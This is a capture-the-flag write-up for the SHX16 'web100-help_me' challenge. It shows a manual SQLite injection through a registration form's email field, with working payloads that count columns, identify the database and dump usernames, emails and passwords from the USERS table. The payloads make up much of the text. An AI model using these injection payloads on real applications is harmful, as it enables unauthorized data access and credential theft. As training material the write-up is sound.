---
title: "SHX16 : web100-help_me"
date: "2017-11-21T15:53:31.000Z"
lastmod: "2017-11-21T22:19:47.000Z"
tags: ["ctf", "web security", "shx16"]
slug: "shx16-web100-help_me"
url: "/shx16-web100-help_me/"
---
I'm seeing a lot of people asking for write-up of this challenge, so here it is!

TLDR It's about a simple `SQLite injection`, and it needs to be done manually. Your `sqlmap` will not work with default settings, maybe w/ some custom parameters and/or a tamper script, but trust-me this is not necessary.

## Enumeration

The most important step of any pentest activity is the recon. In this case we have a login form of a web application, so I started by enumerating directories, scripts, SSL certificate details, system features.

**Directories and files/scripts**

```
C=200    "index.html"
C=200    "register.php"
C=200    "login.php"
C=403    ".git"
C=403    ".git/HEAD"  << This could be interesting, but we do not have access ..
C=403    ".svn"
C=403    ".svn/entries"
```

**SSL certificate details**

```
E = shx@16.com << Good, we have an email, maybe the email from the system administrator?
CN = "SHX#16"
OU = SHX 16
O = SHX
L = FOR
ST = CE
C = BR
```

Browsing the system features I noticed that it does not accepts `duplicated` records for `username` and `email`

![](/content/images/2017/11/Selection_999-2504-.png)

This is what happens when we try to register an existing `username` or `email`

![](/content/images/2017/11/Selection_999-2505-.png)

Looking at the raw response I found a `hidden DIV` showing us some important debug information:

![](/content/images/2017/11/Selection_999-2507-.png)

```
UNIQUE constraint failed: USERS.MAIL  
...
UNIQUE constraint failed: USERS.USERNAME
```

So, we can extract 3 important information from this errors:

- Table name: USERS
- Username column name: USERNAME
- Email column name: MAIL

We also can confirm that already exists an user registered w/ that leaked email w/ this payload:

`first_name=test&last_name=test&user_name=tesst&pass_word=test&email=SHX@16.com`

With this we can bruteforce usernames and emails, but we want more!

## Attack vector

After fuzzing the registration form fields w/ some illegal characters I got a SQL sintax error sending `'` at `mail` field:

`first_name=test&last_name=test&user_name=tesst&pass_word=test&email='`

```
ERROR: SQLSTATE[HY000]: General error: 1 near "test": syntax error
```

Perfect, now we need to find a way to take control of this `INSERT` query.

So, the first step is try to figure out the `number and positions of columns` of the current `INSERT` query.

`email=xx','xxx','a4');#`

```
ERROR: SQLSTATE[HY000]: General error: 1 3 values for 4 columns
```

So, we have 4 columns, if we send 4 columns it register a new user w/ our query data:

`email=xxx','xxx','a4','11');#`

![](/content/images/2017/11/Selection_999-2508-.png)

And now we can figure out the `INSERT` columns order: `email, name, username, password`.

## Data leaking

Now let's try to insert a `sql subquery` in place of parameter `name` to leak some database information. The first idea come in mind is to try get version of this SQL database..

`email=xxx',(select version()),'a4','11');#`

..injection works, but the INSERT fails, this SQL database has no `version()` function..

```
ERROR: SQLSTATE[HY000]: General error: 1 no such function: version
```

Why? because it's not a MySQL database, maybe a `SQLite`? let's test..

`email=xxx',(SELECT tbl_name FROM sqlite_master),'a4','11');#`

![](/content/images/2017/11/Selection_999-2511-.png)

Perfect, it printed the current table name and SQLite confirmed!

Now we have all the pieces to mount our query searching for the flag.

**Counting all entries from `USERS`**

`email=xxxxX',(SELECT count(*) FROM USERS),'a10','11');#`

```
Welcome My Friend
Here your infos:
name: 6
mail: xxxxX
username: a10
password: 11
```

**Dumping the `MAIL` from first `USERS` entry**

`email=xxxxXX',(SELECT MAIL FROM USERS LIMIT 0, 1),'a11','11');#`

```
Welcome My Friend
Here your infos:
name: SHX@16.com
mail: xxxxXX
username: a11
password: 11
```

**Dumping the `ID` from first `USERS` entry**

`email=xxxxXX',(SELECT ID FROM USERS LIMIT 0, 1),'a11','11');#`

```
Welcome My Friend
Here your infos:
name: 31337
mail: xxxxXXXX
username: a13
password: 11
```

**Dumping the `USERNAME` from `USERS` where `ID` is equal to `31337`**

`email=xxxxXXXXX',(SELECT USERNAME FROM USERS WHERE ID=31337),'a14','11');#`

```
Welcome My Friend
Here your infos:
name: flag
mail: xxxxXXXXX
username: a14
password: 11
```

Awesome, and finally dumping the `PASSWORD` from the user where `ID=31337`

![](/content/images/2017/11/Selection_999-2512-.png)

Done!   
Thanks [shellterlabs.com](http://shellterlabs.com)

## References

- SQL Injection in INSERT Query - <http://amolnaik4.blogspot.com.br/2012/02/sql-injection-in-insert-query.html>
- SQLite Injection - <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20injection/SQLite%20Injection.md>
